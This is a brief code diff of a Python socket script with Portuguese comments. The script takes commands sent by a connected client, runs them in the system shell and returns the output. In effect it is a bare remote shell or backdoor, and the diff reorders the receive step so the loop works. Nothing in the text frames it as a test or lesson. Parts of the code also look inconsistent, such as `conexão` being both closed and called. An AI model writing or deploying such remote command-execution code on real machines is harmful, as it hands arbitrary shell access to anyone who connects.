@@ -2,12 +2,12 @@ import subprocess
 import socket
 
 def enviar(c):
-    # pega o dado recebido do cliente e executa no shell
+     # pega o dado recebido do cliente e executa no shell
+    recived = c.recv(1024)
     if recived.decode() == "exit":
         c.close()
         conexão.close()
         exit()
-    recived = c.recv(1024)
     process = subprocess.check_output(recived.decode(), shell=True, universal_newlines=True)
     # envia o resultado de volta para o cliente
     c.sendall(process.encode())
@@ -36,4 +36,5 @@ while True:
 
 # fecha a conexão
 c.close()
+
 conexão()
